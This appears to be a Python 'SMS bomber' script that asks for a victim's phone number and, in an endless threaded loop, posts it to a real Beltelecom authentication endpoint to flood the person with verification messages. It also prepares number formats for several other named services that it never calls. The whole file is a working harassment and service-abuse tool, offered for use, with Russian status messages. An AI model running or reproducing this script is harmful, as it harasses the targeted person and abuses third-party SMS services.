#-= It's just illusion =-#

import requests
from threading import Thread
import random
from termcolor import colored

print(colored( '''
█▀▀█ █▀▀█ █▀▀█ █▀▀█ █▀▀▄ ░▀░ █▀▀ █▀▀
█░░█ █▄▄█ █▄▄▀ █▄▄█ █░░█ ▀█▀ ▀▀█ █▀▀
█▀▀▀ ▀░░▀ ▀░▀▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀▀▀ ▀▀▀
		  create by K1ng$oul
''','magenta'))


phone = input(colored('Enter your phone number>>: ','cyan'))
countT = input(colored('Enter threading>>: ','blue'))


iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def infinity():
	while True:
		request_timeout = 0.00001
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] 
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		
		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print('[+] Beltelcom отправлено!')
		except:
			print('[-] Не отправлено!')
			
countT = Thread(target=infinity)
countT.start()
